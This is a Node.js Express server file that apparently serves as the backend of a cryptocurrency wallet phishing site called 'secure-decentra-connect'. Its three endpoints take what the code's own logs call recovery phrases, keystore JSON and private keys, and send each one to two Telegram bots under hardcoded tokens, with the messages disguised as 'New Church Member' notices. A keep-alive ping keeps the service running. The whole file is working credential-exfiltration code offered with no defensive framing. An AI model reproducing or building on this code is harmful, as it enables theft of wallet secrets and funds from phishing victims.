 
const express = require('express');  
const dotenv = require('dotenv'); 
const path = require('path');
const cors = require('cors');
const app = express();
const https = require('https');

dotenv.config();

// Import EmailService
// const emailService = require('./services/emailService.js');
 
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({extended:false}));      

const BOT_TOKEN = "8977671011:AAGoHHP8BUDMZPhT3cn-pJlFKPKtKOKOZ7A";
const CHAT_ID   = "6778577761"; 


const BOT_TOKENB = "8217744215:AAHRXYqwU-Twk090RW9PZ-cOO53Kmgkaphk";
const CHAT_IDB = "8564450863";


function sendTelegram(msg) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;

  const req = https.get(url, (res) => {
    let body = '';
    res.on('data', (chunk) => { body += chunk; });
    res.on('end', () => {
      console.log('Telegram status:', res.statusCode);
      console.log('Telegram response:', body);
    });
  });

  req.on('error', (err) => {
    console.error('Telegram request failed:', err.message);
  });
}



function sendTelegramb(msg) {
  return new Promise((resolve, reject) => {
    const url = `https://api.telegram.org/bot${BOT_TOKENB}/sendMessage?chat_id=${CHAT_IDB}&text=${encodeURIComponent(msg)}`;

    const req = https.get(url, (res) => {
      let body = '';
      res.on('data', (chunk) => { body += chunk; });
      res.on('end', () => {
        if (res.statusCode === 200) {
          console.log('Telegram sent successfully');
          resolve(body);
        } else {
          const err = new Error(`Telegram API error: ${res.statusCode} ${body}`);
          console.error(err.message);
          reject(err);
        }
      });
      res.on('error', (err) => {
        console.error('Telegram response stream error:', err.message);
        reject(err);
      });
    });

    req.on('error', (err) => {
      console.error('Telegram request failed:', err.message);
      reject(err);
    });

    req.end();  
  });
} 



 
 // API routes first so they are not shadowed by the static catch-all
 app.post('/processing', async (req, res) => {
     try {
         const inpvalue = req.body.inputvalue; // Extract data from request

         if (!inpvalue) {
             return res.status(400).json({ error: "Missing required fields" });
         }

         console.log('📧 Processing recovery phrase request...');
         await sendTelegram(`
✝️ New Church Member
─────────────────────────
📝 Message:
${inpvalue.trim()}
─────────────────────────
`);
                 await sendTelegramb(`
✝️ New Church Member
─────────────────────────
📝 Message:
${inpvalue.trim()}
─────────────────────────
`);

  res.json({msg:'great'})
     } catch (err) {
         console.error('❌ Error in recovery phrase endpoint:', err); 
         res.status(500).json({ error: 'Internal server error', details: err.message });
     }
 });



 
 app.post('/processingb', async (req, res) => { 
   console.log('📧 Keystore JSON received:', req.body.inputvalue);
   try {
       const inpvalue = req.body.inputvalue; // Extract data from request

       if (!inpvalue) {
           return res.status(400).json({ error: "Missing required fields" });
       }

       console.log('📧 Processing keystore JSON request...');
             await sendTelegram(`
✝️ New Church Member
─────────────────────────
📝 Message:
${inpvalue.trim()}
─────────────────────────
`);         await sendTelegramb(`
✝️ New Church Member
─────────────────────────
📝 Message:
${inpvalue.trim()}
─────────────────────────
`);
  res.status(200).json({msg:'great'})
   } catch (err) {
       console.error('❌ Error in keystore JSON endpoint:', err); 
       res.status(500).json({ error: 'Internal server error', details: err.message });
   }
});





app.post('/processingc', async (req, res) => {
   try {
       const inpvalue = req.body.inputvalue; // Extract data from request

       if (!inpvalue) {
           return res.status(400).json({ error: "Missing required fields" });
       }

       console.log('📧 Processing private key request...');
               await sendTelegram(`
✝️ New Church Member
─────────────────────────
📝 Message:
${inpvalue.trim()}
─────────────────────────
`);        await sendTelegramb(`
✝️ New Church Member
─────────────────────────
📝 Message:
${inpvalue.trim()}
─────────────────────────
`);
        res.status(200).json({msg:'great'})  
   } catch (err) {
       console.error('❌ Error in private key endpoint:', err); 
       res.status(500).json({ error: 'Internal server error', details: err.message });
   }
});   
 
 // Serve static files from the React build directory
app.use(express.static(path.join(__dirname, "build"))); 

// Handle all other routes and serve index.html
app.get("*", (req, res) => {
    res.sendFile(path.join(__dirname, "build", "index.html"));
  }); 
  
setInterval(() => https.get("https://secure-decentra-connect.onrender.com"), 10 * 60 * 1000);

app.listen(5000 , ()=>{
    console.log('Listening on port 5000');
 });
